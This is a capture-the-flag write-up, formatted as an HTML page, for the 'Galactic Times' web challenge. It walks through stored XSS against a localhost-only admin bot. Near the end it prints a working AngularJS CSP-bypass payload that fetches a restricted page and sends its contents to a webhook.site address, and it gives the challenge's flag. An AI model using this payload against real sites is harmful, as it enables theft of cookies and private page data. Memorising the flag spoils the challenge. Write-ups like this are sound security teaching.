@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The Galactic Times</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>fastify</li>
+            <li>sqlite</li>
+            <li>pupeteer</li>
+            <li>XSS</li>
+            <li>CSP bypass</li>
+            <li>cloudflare</li>
+            <li>angular lib</li>
+            <li>webhook</li>
+            <li>grabbing cookies</li>
+            <li>webhook</li>
+            <li>localhost restriction</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="The_Galactic_Times_0"></a>The Galactic Times</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">The Galactic Times is a monthly Alien newspaper that focuses on news from around the Galaxy. This month’s issue is focused on the Human race and contains some very controversial articles. The newspaper reportedly contains a restricted endpoint with some Alien secrets. Can you find a way to view the forbidden pages?</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Files_4"></a>Files</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">Provided docker environment.</p>
+<h2 class="code-line" data-line-start=7 data-line-end=8><a id="Looking_around_7"></a>Looking around</h2>
+<p class="has-line-data" data-line-start="8" data-line-end="9">This is the website lmao 😂.</p>
+<p class="has-line-data" data-line-start="10" data-line-end="11"><img src="./web.PNG" alt="web"></p>
+<h2 class="code-line" data-line-start=12 data-line-end=13><a id="Code_12"></a>Code</h2>
+<h3 class="code-line" data-line-start=14 data-line-end=15><a id="routesindexjs_14"></a><code>routes/index.js</code></h3>
+<pre><code class="has-line-data" data-line-start="16" data-line-end="74" class="language-js"><span class="hljs-keyword">const</span> bot = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../bot'</span>);
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
+
+<span class="hljs-keyword">let</span> db;
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">router</span> (<span class="hljs-params">fastify, options</span>) </span>{
+        fastify.get(<span class="hljs-string">'/'</span>, <span class="hljs-keyword">async</span> (request, reply) =&gt; {
+                <span class="hljs-keyword">return</span> reply.type(<span class="hljs-string">'text/html'</span>).send(fs.readFileSync(<span class="hljs-string">'views/index.html'</span>,{encoding:<span class="hljs-string">'utf8'</span>, flag:<span class="hljs-string">'r'</span>}));
+        });
+
+        fastify.get(<span class="hljs-string">'/alien'</span>, <span class="hljs-keyword">async</span> (request, reply) =&gt; {
+                <span class="hljs-keyword">if</span> (request.ip != <span class="hljs-string">'127.0.0.1'</span>) {
+                        <span class="hljs-keyword">return</span> reply.code(<span class="hljs-number">401</span>).send({ message: <span class="hljs-string">'Only localhost is allowed'</span>});
+                }
+                <span class="hljs-keyword">return</span> reply.type(<span class="hljs-string">'text/html'</span>).send(fs.readFileSync(<span class="hljs-string">'views/alien.html'</span>,{encoding:<span class="hljs-string">'utf8'</span>, flag:<span class="hljs-string">'r'</span>}));
+        });
+
+        fastify.get(<span class="hljs-string">'/feedback'</span>, <span class="hljs-keyword">async</span> (request, reply) =&gt; {
+                <span class="hljs-keyword">return</span> reply.type(<span class="hljs-string">'text/html'</span>).send(fs.readFileSync(<span class="hljs-string">'views/feedback.html'</span>,{encoding:<span class="hljs-string">'utf8'</span>, flag:<span class="hljs-string">'r'</span>}));
+        });
+
+        fastify.post(<span class="hljs-string">'/api/submit'</span>, <span class="hljs-keyword">async</span> (request, reply) =&gt; {
+                <span class="hljs-keyword">let</span> { feedback } = request.body;
+
+                <span class="hljs-keyword">if</span> (feedback) {
+                        <span class="hljs-keyword">return</span> db.addFeedback(feedback)
+                                .then(() =&gt; {
+                                        bot.purgeData(db);
+                                        reply.send({ message: <span class="hljs-string">'The Galactic Federation has processed your feedback.'</span> });
+                                })
+                                .catch(() =&gt; reply.send({ message: <span class="hljs-string">'The Galactic Federation spaceship controller has crashed.'</span>, error: <span class="hljs-number">1</span>}));
+                }
+
+                <span class="hljs-keyword">return</span> reply.send({ message: <span class="hljs-string">'Missing parameters.'</span>, error: <span class="hljs-number">1</span> });
+        });
+
+        fastify.get(<span class="hljs-string">'/list'</span>, <span class="hljs-keyword">async</span> (request, reply) =&gt; {
+                <span class="hljs-keyword">if</span> (request.ip != <span class="hljs-string">'127.0.0.1'</span>) {
+                        <span class="hljs-keyword">return</span> reply.code(<span class="hljs-number">401</span>).send({ message: <span class="hljs-string">'Only localhost is allowed'</span>});
+                }
+                <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> db.getFeedback()
+                        .then(feedback =&gt; {
+                                <span class="hljs-keyword">if</span> (feedback) {
+                                        <span class="hljs-keyword">return</span> reply.view(<span class="hljs-string">'views/list.pug'</span>, { feedback: feedback });
+                                }
+                                <span class="hljs-keyword">return</span> reply.send({ message: <span class="hljs-string">'The Galactic Federation archives appear to be empty.'</span> });
+                        })
+                        .catch(() =&gt; {
+                                <span class="hljs-keyword">return</span> reply.send({ message: <span class="hljs-string">'The Galactic Federation spaceship controller has crashed.'</span> });
+                        });
+        });
+}
+
+<span class="hljs-built_in">module</span>.exports = database =&gt; {
+        db = database;
+        <span class="hljs-keyword">return</span> router;
+};
+</code></pre>
+<h3 class="code-line" data-line-start=75 data-line-end=76><a id="databasejs_75"></a><code>database.js</code></h3>
+<pre><code class="has-line-data" data-line-start="77" data-line-end="130" class="language-js"><span class="hljs-keyword">const</span> sqlite = <span class="hljs-built_in">require</span>(<span class="hljs-string">'sqlite-async'</span>);
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Database</span> </span>{
+    constructor(db_file) {
+        <span class="hljs-keyword">this</span>.db_file = db_file;
+        <span class="hljs-keyword">this</span>.db = <span class="hljs-literal">undefined</span>;
+    }
+    
+    <span class="hljs-keyword">async</span> connect() {
+        <span class="hljs-keyword">this</span>.db = <span class="hljs-keyword">await</span> sqlite.open(<span class="hljs-keyword">this</span>.db_file);
+    }
+
+    <span class="hljs-keyword">async</span> migrate() {
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.db.exec(<span class="hljs-string">`
+            DROP TABLE IF EXISTS feedback;
+
+            CREATE TABLE IF NOT EXISTS feedback (
+                id         INTEGER      NOT NULL PRIMARY KEY AUTOINCREMENT,
+                comment  VARCHAR(255) NOT NULL,
+                created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP
+            );
+
+            INSERT INTO feedback (comment) VALUES ('Issue #256 is the best issue so far. Keep up the good work.');
+            INSERT INTO feedback (comment) VALUES ('Articles could be better. The memes are not very realistic.');
+            INSERT INTO feedback (comment) VALUES ('This article is very specist. Humans are better than that.');
+        `</span>);
+    }
+
+    <span class="hljs-keyword">async</span> addFeedback(comment) {
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-keyword">async</span> (resolve, reject) =&gt; {
+            <span class="hljs-keyword">try</span> {
+                <span class="hljs-keyword">let</span> stmt = <span class="hljs-keyword">await</span> <span class="hljs-keyword">this</span>.db.prepare(<span class="hljs-string">'INSERT INTO feedback (comment) VALUES (?)'</span>);
+                resolve(<span class="hljs-keyword">await</span> stmt.run(comment));
+            } <span class="hljs-keyword">catch</span>(e) {
+                reject(e);
+            }
+        });
+    }
+
+    <span class="hljs-keyword">async</span> getFeedback() {
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-keyword">async</span> (resolve, reject) =&gt; {
+            <span class="hljs-keyword">try</span> {
+                <span class="hljs-keyword">let</span> stmt = <span class="hljs-keyword">await</span> <span class="hljs-keyword">this</span>.db.prepare(<span class="hljs-string">'SELECT * FROM feedback'</span>);
+                resolve(<span class="hljs-keyword">await</span> stmt.all());
+            } <span class="hljs-keyword">catch</span>(e) {
+                reject(e);
+            }
+        });
+    }
+}
+
+<span class="hljs-built_in">module</span>.exports = Database;
+</code></pre>
+<h3 class="code-line" data-line-start=131 data-line-end=132><a id="botjs_131"></a><code>bot.js</code></h3>
+<pre><code class="has-line-data" data-line-start="133" data-line-end="167" class="language-js"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">'puppeteer'</span>);
+
+<span class="hljs-keyword">const</span> browser_options = {
+    headless: <span class="hljs-literal">true</span>,
+    args: [
+        <span class="hljs-string">'--no-sandbox'</span>,
+        <span class="hljs-string">'--disable-background-networking'</span>,
+        <span class="hljs-string">'--disable-default-apps'</span>,
+        <span class="hljs-string">'--disable-extensions'</span>,
+        <span class="hljs-string">'--disable-gpu'</span>,
+        <span class="hljs-string">'--disable-sync'</span>,
+        <span class="hljs-string">'--disable-translate'</span>,
+        <span class="hljs-string">'--hide-scrollbars'</span>,
+        <span class="hljs-string">'--metrics-recording-only'</span>,
+        <span class="hljs-string">'--mute-audio'</span>,
+        <span class="hljs-string">'--no-first-run'</span>,
+        <span class="hljs-string">'--safebrowsing-disable-auto-update'</span>
+    ]
+};
+
+<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">purgeData</span>(<span class="hljs-params">db</span>)</span>{
+    <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.launch(browser_options);
+    <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> browser.newPage();
+
+    <span class="hljs-keyword">await</span> page.goto(<span class="hljs-string">'http://127.0.0.1:1337/list'</span>, {
+        waitUntil: <span class="hljs-string">'networkidle2'</span>
+    });
+
+    <span class="hljs-keyword">await</span> browser.close();
+    <span class="hljs-keyword">await</span> db.migrate();
+};
+
+<span class="hljs-built_in">module</span>.exports = { purgeData };
+</code></pre>
+<h3 class="code-line" data-line-start=168 data-line-end=169><a id="viewsalienthtml_168"></a><code>views/alient.html</code></h3>
+<pre><code class="has-line-data" data-line-start="170" data-line-end="180" class="language-html">[REDACTED]
+<span class="hljs-tag">&lt;<span class="hljs-title">aside</span>&gt;</span>    
+    <span class="hljs-tag">&lt;<span class="hljs-title">div</span>&gt;</span>                                                                                             
+        <span class="hljs-tag">&lt;<span class="hljs-title">div</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"issue"</span>&gt;</span>⟟⌇⌇⎍⟒ #256<span class="hljs-tag">&lt;/<span class="hljs-title">div</span>&gt;</span>                                                            
+        <span class="hljs-tag">&lt;<span class="hljs-title">div</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"date"</span>&gt;</span>⎎⍀⟟⎅⏃⊬, 29 ⋔⏃⍀☊⊑, 2069<span class="hljs-tag">&lt;/<span class="hljs-title">div</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-title">div</span> <span class="hljs-attribute">class</span>=<span class="hljs-value">"edition"</span>&gt;</span>CHTB{f4k3_fl4g_f0r_t3st1ng}<span class="hljs-tag">&lt;/<span class="hljs-title">div</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-title">div</span>&gt;</span>                    
+<span class="hljs-tag">&lt;/<span class="hljs-title">aside</span>&gt;</span>
+[REDACTED]
+</code></pre>
+<h2 class="code-line" data-line-start=181 data-line-end=182><a id="Methodology_181"></a>Methodology</h2>
+<p class="has-line-data" data-line-start="182" data-line-end="183">We have to perform a <code>GET /alien</code> to get the flag which is in the <code>html</code>. However we will get blocked because the request is not coming from <code>127.0.0.1</code>. We can perform <code>POST /api/submit</code> to give feedback. This feedback gets saved in the database. After that <code>purgeData()</code> is called and the bot visits <code>http://127.0.0.1:1337/list</code>. This endpoint list all feedback including our recently added feedback. We cannot perform the <code>GET /list</code> ourselves because we will get blocked again due to <code>127.0.0.1</code> restriction. The added feedback is not sanitized therefore we can inject <code>html</code> tags without problems.</p>
+<p class="has-line-data" data-line-start="184" data-line-end="185">The idea here is to insert a feedback containing <code>XSS</code> <code>&lt;script&gt;</code> tags. The bot will open the <code>/list</code> and parse the page which contains our <code>XSS</code> payload which will execute. The <code>XSS</code> payload should perform a <code>GET /alien</code> (which is fine because the request is coming from localhost) and send the page <code>html</code> to our remote listening endpoint.</p>
+<p class="has-line-data" data-line-start="186" data-line-end="187">There is a problem. The server enforces <code>CSP</code>. Example.</p>
+<pre><code class="has-line-data" data-line-start="189" data-line-end="191">Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-eval' https://cdnjs.cloudflare.com/;style-src 'self' 'unsafe-inline' https://unpkg.com/nes.css/ https://fonts.googleapis.com/;font-src 'self' https://fonts.gstatic.com/;img-src 'self' data:;child-src 'none';object-src 'none'
+</code></pre>
+<p class="has-line-data" data-line-start="192" data-line-end="193">For better understanding we can use <a href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a>.</p>
+<p class="has-line-data" data-line-start="194" data-line-end="195"><img src="./csp.PNG" alt="csp"></p>
+<p class="has-line-data" data-line-start="196" data-line-end="197">There is unsafe-eval for <code>https://cdnjs.cloudflare.com</code>. <a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#third-party-endpoints-unsafe-eval">HackTricks</a> has a payload specifically for <code>cloudflare</code>, yay 🥳. The payload uses an <code>angular</code> scripts which is hosted on <code>cloudflare</code> with which we can perform <code>XHR</code> requests. With this we can perform a request (to <code>/alien</code>) and get the page content. Then we will send the page content to our remote endpoint.</p>
+<p class="has-line-data" data-line-start="198" data-line-end="199">On more problem is, that the <code>/alien</code> page contains weird characters and (probably) the method in the payload will crash when reading those characters. So we will only “grep” a string from the page cointaing <code>CHTB{.*}</code> using js method <code>match()</code>.</p>
+<h2 class="code-line" data-line-start=200 data-line-end=201><a id="Exploit_200"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="201" data-line-end="202">Be sure to substitute the <code>location</code> with your own remote endpoint. We use <a href="https://webhook.site/">webhook.site</a>.</p>
+<pre><code class="has-line-data" data-line-start="204" data-line-end="206">&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&quot;&gt;&lt;/script&gt;&lt;div ng-app&gt; {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };var z=new XMLHttpRequest();z.onreadystatechange=function(){if (z.responseText) location=&quot;https://webhook.site/4b9d1f8b-6d9a-4973-9a27-b81b2eebbaae?a=&quot;+btoa(z.responseText.match(/CHTB{.*}/)[0])};z.open(&quot;GET&quot;,&quot;http://127.0.0.1:1337/alien&quot;,false);z.send();//');}} &lt;/div&gt;
+</code></pre>
+<p class="has-line-data" data-line-start="207" data-line-end="209">Sending payload…<br>
+<img src="./feedback.PNG" alt="feedback"></p>
+<p class="has-line-data" data-line-start="210" data-line-end="212">We get a hit! 🙂<br>
+<img src="./hook.PNG" alt="hook"></p>
+<p class="has-line-data" data-line-start="213" data-line-end="214">Parameter <code>a</code> contains <code>base64</code> encoded flag.</p>
+<pre><code class="has-line-data" data-line-start="216" data-line-end="219">$ echo -n 'Q0hUQnt0aDNfd2gxdDNsMXN0M2RfQ05EX3N0cjFrM3NfYjRja30=' | base64 -d
+CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}
+</code></pre>
+<h2 class="code-line" data-line-start=220 data-line-end=221><a id="Flag_220"></a>Flag</h2>
+<p class="has-line-data" data-line-start="221" data-line-end="222"><strong>CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
